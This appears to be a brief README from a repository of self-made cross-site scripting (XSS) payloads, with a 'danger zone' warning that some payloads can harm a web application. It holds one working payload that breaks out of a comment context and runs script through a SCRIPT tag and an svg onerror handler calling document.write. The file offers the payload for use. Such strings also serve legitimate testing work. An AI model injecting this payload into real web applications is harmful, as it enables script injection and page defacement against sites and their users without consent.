# xss
Personally created XSS payloads

# Danger zone! <br>
> Danger zone is the area which xss payloads can be OR will be harmfull to a web application <br>

> So, do no use them unless you're sure the web app will not be damaged! <br>

## Document.write <br>

```html
;//<!----><SCRIPT>alert(1);</SCRIPT><svg onerror="alert(document.write(1337))">
```
